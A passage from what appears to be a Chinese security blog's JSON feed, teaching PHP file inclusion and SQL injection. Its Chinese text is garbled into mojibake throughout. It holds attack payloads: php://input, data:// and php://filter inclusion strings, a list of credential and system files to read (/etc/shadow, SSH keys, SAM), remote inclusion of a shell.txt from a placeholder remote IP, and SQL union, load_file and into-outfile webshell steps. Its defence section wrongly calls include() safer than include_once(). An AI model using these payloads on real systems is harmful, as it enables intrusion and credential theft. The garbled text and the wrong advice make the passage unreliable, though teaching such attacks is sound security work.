åŒæ—¶ post æƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphp æ‰§è¡Œæ—¶ä¼šå°† post å†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</li>\n<li>æ¯”å¦‚å†™<?php phpinfo();?> æˆ–è€…å†™ä¸€å¥è¯ï¼Ÿfile=php://input POST: éœ€è¦å†™å…¥çš„æ•°æ®</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/13.png\" alt=\"\"></p>\n<h4 id=\"phpfile\"><a class=\"markdownIt-Anchor\" href=\"#phpfile\">#</a> php://file</h4>\n<ol>\n<li>ç”¨å®ƒæ¥æœ¬åœ°åŒ…å«è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶æ¯”å¦‚ file:///etc/passwd</li>\n<li>è¯»å–ç›¸å¯¹è·¯å¾„ php?file=â€¦/â€¦/php.ini</li>\n</ol>\n<h4 id=\"phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#phpfilter\">#</a> php://filter</h4>\n<ol>\n<li>\n<p>php://filter/convert.base64-encode/resource = æ–‡ä»¶è·¯å¾„ base64 è¯»å–è¯»å–å base è§£ç å¾—åˆ°æºç </p>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/14.png\" alt=\"\"></p>\n</li>\n<li>\n<p>è§£ç å¾—åˆ° admin password</p>\n</li>\n</ol>\n<h4 id=\"zip\"><a class=\"markdownIt-Anchor\" href=\"#zip\">#</a> zip://</h4>\n<ol>\n<li>\n<p>ç”¨äºè®¿é—®å¯¹åº”çš„å‹ç¼©æ–‡ä»¶å­æ–‡ä»¶ä½†æ˜¯è¦ç»å¯¹è·¯å¾„ zip æ–‡ä»¶è·Ÿå­æ–‡ä»¶è¦ç”¨# %23 åˆ†å‰²ï¼Œ åªéœ€è¦æ˜¯ zip çš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹</p>\n</li>\n<li>\n<p>ç›¸åŒçš„ç±»å‹è¿˜æœ‰ zlib:// å’Œ bzip2://</p>\n</li>\n<li>\n<p>åˆ©ç”¨ page=zip://D:\\Everydaytools\\phpstudy_pro\\WWW\\www.dvwa.com\\vulnerabilities\\123.zip%23123.txt</p>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/15.png\" alt=\"\"></p>\n</li>\n<li>\n<p>å¾—åˆ° 123.zip é‡Œé¢çš„ 123.txt</p>\n</li>\n</ol>\n<h4 id=\"dataåè®®\"><a class=\"markdownIt-Anchor\" href=\"#dataåè®®\">#</a> data:// åè®®</h4>\n<ol>\n<li>\n<p>ç±»ä¼¼ä¸ php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„ data:// æµä¼šè¢«å½“ä½œ php æ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>\n</li>\n<li>\n<p>?page=data://text/plain,<?php phpinfo();?>æˆ–è€…ç”¨ baes64 ç¼–ç åï¼Ÿpage=data://text/plain,PD9waHAgcGhwaW5mbygpOz8+</p>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/16.png\" alt=\"\"></p>\n</li>\n</ol>\n<h3 id=\"æ–‡ä»¶åŒ…å«å¸¸ç”¨è·¯å¾„\"><a class=\"markdownIt-Anchor\" href=\"#æ–‡ä»¶åŒ…å«å¸¸ç”¨è·¯å¾„\">#</a> æ–‡ä»¶åŒ…å«å¸¸ç”¨è·¯å¾„</h3>\n<h4 id=\"æ—¥å¿—æ–‡ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#æ—¥å¿—æ–‡ä»¶\">#</a> æ—¥å¿—æ–‡ä»¶</h4>\n<ol>\n<li>/usr/local/apache2/logs/access_log</li>\n<li>/logs/access_log</li>\n<li>/etc/httpd/logs/access_log</li>\n<li>/var/log/httpd/access_log</li>\n<li>/var/log/nginx/access.log</li>\n<li>/var/log/nginx/error.log</li>\n<li>$CATALINA_BASE/logs/access_log</li>\n<li>$CATALINA_BASE/logs/catalina.out</li>\n</ol>\n<h4 id=\"ç½‘ç«™é…ç½®æ–‡ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#ç½‘ç«™é…ç½®æ–‡ä»¶\">#</a> ç½‘ç«™é…ç½®æ–‡ä»¶</h4>\n<ol>\n<li>dedecms-- data/common.inc.php,</li>\n<li>discuz å…¨â€“config/config_global.php,</li>\n<li>phpcmsâ€“caches/configs/database.php</li>\n<li>phpwind- -conf/database.php</li>\n<li>wordpress-- wp-config.php</li>\n</ol>\n<h4 id=\"ç³»ç»Ÿé…ç½®æ–‡ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#ç³»ç»Ÿé…ç½®æ–‡ä»¶\">#</a> ç³»ç»Ÿé…ç½®æ–‡ä»¶</h4>\n<p>linux</p>\n<p>/root/.ssh/authorized_keys</p>\n<p>/root/.ssh/id_rsa</p>\n<p>/root/.ssh/id_ras.keystore</p>\n<p>/root/.ssh/known_hosts</p>\n<p>/etc/passwd</p>\n<p>/etc/shadow</p>\n<p>/etc/my.cnf</p>\n<p>/etc/httpd/conf/httpd.conf</p>\n<p>/root/.bash_history</p>\n<p>/root/.mysql_history</p>\n<p>/proc/self/fd/fd [0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)</p>\n<p>/proc/mounts</p>\n<p>/porc/config.gz</p>\n<p>win</p>\n<p>C:/Windows/System32/inetsrv/MetaBase.xml//IIS é…ç½®</p>\n<p>C:/Windows/repairsam// åˆæ¬¡å®‰è£…çš„å¯†ç </p>\n<p>C:/Program Files/mysql/my.ini//Mysql é…ç½®</p>\n<p>C:/Program Files/mysql/data/mysql/user.MYD//Mysql root</p>\n<p>C:/Windows/php.ini//php é…ç½®</p>\n<p>C:/Windows/my.ini//Mysql é…ç½®</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"è¿œç¨‹æ–‡ä»¶åŒ…å«\"><a class=\"markdownIt-Anchor\" href=\"#è¿œç¨‹æ–‡ä»¶åŒ…å«\">#</a> è¿œç¨‹æ–‡ä»¶åŒ…å«</h3>\n<ol>\n<li>å½“è¿œç¨‹æ–‡ä»¶å¼€å¯æ—¶ï¼Œå¯ä»¥åŒ…å«è¿œç¨‹æ–‡ä»¶åˆ°æœ¬åœ°æ‰§è¡Œã€‚å½“ allow_url_fopen=On allow_url_include=ON ä¸¤ä¸ªæ¡ä»¶åŒæ—¶ä¸º On å…è®¸è¿œç¨‹åŒ…å«æ–‡ä»¶ã€‚</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xMDMvbGZpLnBocD9maWxlPWh0dHA6Ly8xOTIuMTY4LjAuMTAzL3NoZWxsLnR4dA==\">http://192.168.0.103/lfi.php?file=http://xxx.xxx.xxx.xxx/shell.txt</span> xxx.xxx.xxx.xxx è®¾ç½®ä¸ºè¿œç¨‹çš„ ip</li>\n</ol>\n<h3 id=\"æ–‡ä»¶åŒ…å«æˆªæ–­\"><a class=\"markdownIt-Anchor\" href=\"#æ–‡ä»¶åŒ…å«æˆªæ–­\">#</a> æ–‡ä»¶åŒ…å«æˆªæ–­</h3>\n<h4 id=\"00æˆªæ–­\"><a class=\"markdownIt-Anchor\" href=\"#00æˆªæ–­\">#</a> %00 æˆªæ–­</h4>\n<ol>\n<li>php ç‰ˆæœ¬è¦ä½äº 5.3.4 ä½¿ç”¨ include ç­‰æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå¯ä»¥æˆªæ–­æ–‡ä»¶åï¼Œä½†æ˜¯ä¼šå— gpc å½±å“ï¼Œå¦‚æœ gpc ä¸º On æ—¶ï¼Œ%00 ä¼šè¢«è½¬ä»¥æˆ \\0 æˆªæ–­ä¼šå¤±è´¥ã€‚</li>\n</ol>\n<h4 id=\"è¶…é•¿æ–‡ä»¶åŒ…å«æˆªæ–­\"><a class=\"markdownIt-Anchor\" href=\"#è¶…é•¿æ–‡ä»¶åŒ…å«æˆªæ–­\">#</a> è¶…é•¿æ–‡ä»¶åŒ…å«æˆªæ–­</h4>\n<ol>\n<li>åˆé€‚äº win32 å¯ä»¥ä½¿ç”¨ã€‚è¿›è¡Œæˆªæ–­ å’Œ .(php ç‰ˆæœ¬å°äº 5.2.8 å¯ä»¥æˆåŠŸï¼Œlinux éœ€è¦æ–‡ä»¶åé•¿äº 4096ï¼Œwindows éœ€è¦é•¿äº 256) åˆ©ç”¨æ“ä½œç³»ç»Ÿå¯¹ç›®å½•æœ€å¤§é•¿åº¦é™åˆ¶ã€‚åœ¨ window ä¸‹ 256 å­—èŠ‚ linux ä¸‹ 4096 å­—èŠ‚</li>\n</ol>\n<h4 id=\"ç‚¹æˆªæ–­\"><a class=\"markdownIt-Anchor\" href=\"#ç‚¹æˆªæ–­\">#</a> ç‚¹æˆªæ–­</h4>\n<ol>\n<li>php?file=x.jpgâ€¦</li>\n</ol>\n<h4 id=\"æˆªæ–­\"><a class=\"markdownIt-Anchor\" href=\"#æˆªæ–­\">#</a> /. æˆªæ–­</h4>\n<ol>\n<li>php?file=shell.png%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e</li>\n</ol>\n<h4 id=\"è¿œç¨‹åŒ…å«æˆªæ–­\"><a class=\"markdownIt-Anchor\" href=\"#è¿œç¨‹åŒ…å«æˆªæ–­\">#</a> è¿œç¨‹åŒ…å«æˆªæ–­</h4>\n<ol>\n<li>?url=%3f</li>\n<li>00url=%00</li>\n<li>#url=%23</li>\n</ol>\n<h3 id=\"é˜²å¾¡\"><a class=\"markdownIt-Anchor\" href=\"#é˜²å¾¡\">#</a> é˜²å¾¡</h3>\n<ol>\n<li>è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼š</li>\n</ol>\n<ul>\n<li>å¯¹ç”¨æˆ·æä¾›çš„è¾“å…¥è¿›è¡ŒéªŒè¯å’Œè¿‡æ»¤ï¼Œç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸åŒ…å«æ¶æ„æ•°æ®ã€‚</li>\n<li>ä½¿ç”¨ç™½åå•æ§åˆ¶ï¼Œåªå…è®¸åº”ç”¨ç¨‹åºéœ€è¦çš„æ–‡ä»¶å’Œç›®å½•è¢«åŒ…å«ã€‚</li>\n</ul>\n<ol>\n<li>ä½¿ç”¨ç™½åå•æ§åˆ¶ï¼š</li>\n</ol>\n<ul>\n<li>ç¡®ä¿åªæœ‰å¯ä¿¡çš„æ–‡ä»¶å’Œç›®å½•è¢«åŒ…å«ã€‚ä¸è¦ä»ç”¨æˆ·æä¾›çš„æ•°æ®ä¸­æ„å»ºæ–‡ä»¶è·¯å¾„ã€‚</li>\n<li>é™åˆ¶åŒ…å«æ–‡ä»¶çš„ç›®å½•ï¼Œåªå…è®¸è®¿é—®åº”ç”¨ç¨‹åºéœ€è¦çš„æ–‡ä»¶å’Œç›®å½•ã€‚</li>\n</ul>\n<ol>\n<li>é¿å…ç›´æ¥ç”¨æˆ·è¾“å…¥ï¼š</li>\n</ol>\n<ul>\n<li>ä¸è¦ç›´æ¥å°†ç”¨æˆ·è¾“å…¥ç”¨ä½œåŒ…å«æ–‡ä»¶çš„è·¯å¾„ã€‚å¦‚æœå¿…é¡»ä½¿ç”¨ç”¨æˆ·æä¾›çš„è¾“å…¥ï¼Œç¡®ä¿å¯¹å…¶è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’ŒéªŒè¯</li>\n<li>ä½¿ç”¨å®‰å…¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå¦‚ include () å’Œ require ()ï¼Œè€Œä¸æ˜¯ä¸å®‰å…¨çš„å‡½æ•°ï¼Œå¦‚ include_once () å’Œ require_once ()ã€‚</li>\n</ul>\n<ol>\n<li>æ–‡ä»¶æƒé™ï¼š</li>\n</ol>\n<ul>\n<li>è®¾ç½®é€‚å½“çš„æ–‡ä»¶å’Œç›®å½•æƒé™ï¼Œä»¥ç¡®ä¿åªæœ‰æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®å’Œæ‰§è¡Œæ–‡ä»¶ã€‚</li>\n<li>é¿å…å°†æ•æ„Ÿæ–‡ä»¶æ”¾åœ¨ Web æ ¹ç›®å½•ä¸‹ï¼Œä»¥å‡å°‘å¯èƒ½çš„æ”»å‡»é¢ã€‚</li>\n</ul>\n<ol>\n<li>é…ç½®å®‰å…¨ï¼š</li>\n</ol>\n<ul>\n<li>é…ç½® Web æœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºæ¡†æ¶ä»¥æœ€å°åŒ–æ”»å‡»é¢ã€‚</li>\n<li>ç¦ç”¨ä¸å¿…è¦çš„æ–‡ä»¶åŒ…å«åŠŸèƒ½ï¼Œå¦‚ allow_url_fopen å’Œ allow_url_includeï¼Œä»¥é˜²æ­¢åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚</li>\n</ul>\n<ol>\n<li>ç›‘æ§å’Œæ—¥å¿—ï¼š</li>\n</ol>\n<ul>\n<li>å®æ–½ç›‘æ§å’Œæ—¥å¿—åŠŸèƒ½ï¼Œä»¥åŠæ—¶æ£€æµ‹å’Œå“åº”æ½œåœ¨çš„æ–‡ä»¶åŒ…å«æ”»å‡»ã€‚</li>\n</ul>\n<ol>\n<li>å®‰å…¨å¼€å‘å®è·µï¼š</li>\n</ol>\n<ul>\n<li>åŸ¹è®­å¼€å‘äººå‘˜ï¼Œä½¿ä»–ä»¬äº†è§£æ–‡ä»¶åŒ…å«æ¼æ´å’Œå…¶ä»–å¸¸è§ Web åº”ç”¨ç¨‹åºæ¼æ´ã€‚</li>\n<li>ä½¿ç”¨å®‰å…¨ç¼–ç¨‹æŠ€æœ¯ï¼Œå¦‚è¾“å‡ºç¼–ç å’Œé˜²æ­¢ SQL æ³¨å…¥ï¼Œä»¥åŠ å¼ºåº”ç”¨ç¨‹åºçš„æ•´ä½“å®‰å…¨æ€§ã€‚</li>\n</ul>\n<ol>\n<li>å®‰å…¨æ‰«æï¼š</li>\n</ol>\n<ul>\n<li>å®šæœŸè¿›è¡Œå®‰å…¨æ‰«æå’Œæ¸—é€æµ‹è¯•ï¼Œä»¥è¯†åˆ«å’Œä¿®å¤æ–‡ä»¶åŒ…å«æ¼æ´ä»¥åŠå…¶ä»–æ½œåœ¨çš„æ¼æ´ã€‚</li>\n</ul>\n<p>ç»¼ä¸Šæ‰€è¿°ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´çš„é˜²å¾¡éœ€è¦ç»¼åˆä½¿ç”¨å¤šç§æ–¹æ³•ï¼ŒåŒ…æ‹¬è¾“å…¥éªŒè¯ã€ç™½åå•æ§åˆ¶ã€æ–‡ä»¶æƒé™ç®¡ç†ã€å®‰å…¨é…ç½®å’Œæ•™è‚²å¼€å‘äººå‘˜ç­‰æªæ–½ã€‚è¿™äº›æªæ–½æœ‰åŠ©äºé™ä½æ–‡ä»¶åŒ…å«æ¼æ´å¯¹åº”ç”¨ç¨‹åºçš„é£é™©ã€‚</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/",
            "url": "http://gyzero.shop/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/",
            "title": "sqlæ³¨å…¥",
            "date_published": "2023-10-28T11:09:44.000Z",
            "content_html": "<div class=\"note info\">\n<p>å¯¹ mysql ä¸äº†è§£çš„ä¸ä¼šè¯­å¥çš„å»çœ‹æ•°æ®åº“ç¯‡</p>\n</div>\n<h3 id=\"mysqlæ•°æ®åº“ç»“æ„\"><a class=\"markdownIt-Anchor\" href=\"#mysqlæ•°æ®åº“ç»“æ„\">#</a> <span class=\"kbd\">mysql æ•°æ®åº“ç»“æ„</span></h3>\n<p>mysql15 ä»¥åé»˜è®¤å­˜æ”¾ä¸€ä¸ª infomation_schema é‡Œé¢ è¿™ä¸ªåº“é‡Œé¢æœ‰å¾ˆå¤šè¡¨ é‡ç‚¹æ˜¯è¿™ä¸‰ä¸ªè¡¨ columns ã€tablesã€schemata è¡¨å­—æ®µ CHEMA_NAME è®°å½•ç€åº“çš„ä¿¡æ¯</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero1.png\" alt=\"\"></p>\n<p>tables è¡¨å­—æ®µ TABLE_SCHEMA ã€TABLE_NAME åˆ†åˆ«è®°å½•ç€åº“åå’Œè¡¨å</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero2.png\" alt=\"\"></p>\n<p>columns å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€æ ‡åå’Œå­—æ®µå</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero3.png\" alt=\"\"></p>\n<p>æŸ¥è¯¢ admin åº“ä¸­æ‰€æœ‰è¡¨å­—æ®µ</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero4.png\" alt=\"\"></p>\n<p>æŸ¥è¯¢æŸä¸ªåº“æŸä¸ªè¡¨çš„å­—æ®µå¯ä»¥è¿™æ ·æŸ¥è¯¢</p>\n<p>select * from information_schema.COLUMNS where TABLE_SCHEMA=â€˜adminâ€™ and</p>\n<p>TABLE_NAME=â€˜adminâ€™</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero5.png\" alt=\"\"></p>\n<h3 id=\"2sqlæ³¨å…¥åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#2sqlæ³¨å…¥åŸç†\">#</a> <span class=\"kbd\">2.sql æ³¨å…¥åŸç†</span></h3>\n<p>SQL æ³¨å…¥æ¼æ´çš„äº§ç”Ÿéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ ï¬ å‚æ•°ç”¨æˆ·å¯æ§ï¼šä»å‰ç«¯ä¼ ç»™åç«¯çš„å‚æ•°å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ ï¬ å‚æ•°å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼šä¼ å…¥çš„å‚æ•°æ‹¼æ¥åˆ° SQL è¯­å¥ï¼Œä¸”å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚</p>\n<p>å½“ç”¨æˆ·ä¼ å…¥å‚æ•°ä¸º 1â€™çš„æ—¶å€™ï¼Œåœ¨æ•°æ®åº“æ‰§è¡Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' æ­¤ SQL è¯­å¥ä¸ç¬¦åˆè¯­æ³•è§„åˆ™å°±ä¼šæŠ¥é”™ã€‚</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>You have an error in your SQL syntax; check the manual that corresponds</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>to your MySQL server version for the right syntax to use near '''</span> at line <span class=\"token number\">1</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>å½“ç”¨æˆ·ä¼ å…¥å‚æ•°ä¸º <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> æ—¶ <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> å› ä¸º <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> ä¸ºçœŸ</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> ä¹Ÿæ˜¯çœŸ <span class=\"token operator\">and</span> ä¸¤è¾¹å‡ä¸ºçœŸ æ‰€ä»¥é¡µé¢ä¼šè¿”å› id<span class=\"token operator\">=</span><span class=\"token number\">1</span> çš„ç»“æœã€‚ å¦‚æœç”¨æˆ·ä¼ å…¥å‚æ•°ä¸º <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> æ—¶</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>å› ä¸º <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> ä¸ºå‡ id<span class=\"token operator\">=</span><span class=\"token number\">1</span> ä¸ºçœŸ <span class=\"token operator\">and</span> ä¸¤è¾¹æœ‰ä¸€ä¸ªä¸ºå‡ï¼Œæ‰€ä»¥é¡µé¢è¿”å›ä¸ id<span class=\"token operator\">=</span><span class=\"token number\">1</span> ä¸ä¸€æ ·çš„ç»“æœã€‚</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ç”±æ­¤å¯ä»¥åˆæ­¥åˆ¤æ–­å­˜åœ¨ <span class=\"token keyword\">SQL</span> æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¿›ä¸€æ­¥æ‹¼æ¥  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">\"1\"</span> <span class=\"token operator\">or</span> <span class=\"token string\">\"1\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr></table></figure><p>åˆ¤æ–­é¡µé¢æ˜¯å¦ä¸ä¸€æ ·ï¼Œè¿˜æœ‰æ— å›æ˜¾çš„æƒ…å†µè¾“å…¥è¯­å¥é¡µé¢æ²¡æœ‰å˜åŒ–ä½†å®é™…ä¸Šæ‰§è¡Œäº†è¿™ç§è¿˜æœ‰å»¶æ—¶æ³¨å…¥ç»™æ‹¼æ¥è¯­å¥æ—¶ sleep 5 çœ‹é¡µé¢æ˜¯ä¸æ˜¯ 5 ç§’åæ˜¾ç¤ºçš„</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">sql</span>æ³¨é‡Šç¬¦</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token comment\"># å•è¡Œæ³¨é‡Š url ç¼–ç  %23</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*  */</span> å¤šè¡Œæ³¨é‡Š <span class=\"token comment\">/**/</span>å½“ç©ºæ ¼ç”¨</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">--\"ç©ºæ ¼\" å•è¡Œæ³¨é‡Š</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">--+ ä¹Ÿå¯ä»¥</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>æ˜¯å¦å­˜åœ¨æ³¨å…¥åˆ¤æ–­æ³¨å…¥çš„ç±»å‹æ˜¯ä»€ä¹ˆ</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>åˆ¤æ–­å­—æ®µæ•° <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>ç¡®å®šå›æ˜¾ç‚¹ <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯ @<span class=\"token variable\">@version</span> @<span class=\"token variable\">@datadir</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>æŸ¥è¯¢ç”¨æˆ·åï¼Œæ•°æ®åº“å <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>æ–‡ä»¶è¯»å– <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'C:\\\\wondows\\\\win.ini'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>å†™å…¥ webshell <span class=\"token keyword\">select</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>è¡¥å……ä¸€ç‚¹ï¼Œä½¿ç”¨ <span class=\"token keyword\">sql</span> æ³¨å…¥é‡åˆ°è½¬ä¹‰å­—ç¬¦ä¸²çš„å•å¼•å·æˆ–è€…åŒå¼•å·ï¼Œå¯ä½¿ç”¨ HEX ç¼–ç ç»•è¿‡</pre></td></tr></table></figure><h3 id=\"æ³¨å…¥ç±»å‹\"><a class=\"markdownIt-Anchor\" href=\"#æ³¨å…¥ç±»å‹\">#</a> <span class=\"kbd\">æ³¨å…¥ç±»å‹</span></h3>\n<p>SQL æ³¨å…¥åˆ†ç±»ï¼šæŒ‰ SQLMap ä¸­çš„åˆ†ç±»æ¥çœ‹ï¼ŒSQL æ³¨å…¥ç±»å‹æœ‰ä»¥ä¸‹ 5 ç§ï¼š</p>\n<p>UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</p>\n<p>Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰</p>\n<p>å †å æŸ¥è¯¢ Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</p>\n<p>Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</p>\n<p>Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</p>\n<h4 id=\"æ¥å—è¯·æ±‚ç±»å‹åŒºåˆ†\"><a class=\"markdownIt-Anchor\" href=\"#æ¥å—è¯·æ±‚ç±»å‹åŒºåˆ†\">#</a> <span class=\"kbd\">æ¥å—è¯·æ±‚ç±»å‹åŒºåˆ†</span></h4>\n<p>GET æ³¨å…¥</p>\n<p>GET è¯·æ±‚çš„å‚æ•°æ˜¯æ”¾åœ¨ URL é‡Œçš„ï¼ŒGET è¯·æ±‚çš„ URL ä¼ å‚æœ‰é•¿åº¦é™åˆ¶ ä¸­æ–‡éœ€è¦ URL ç¼–ç </p>\n<p>POST 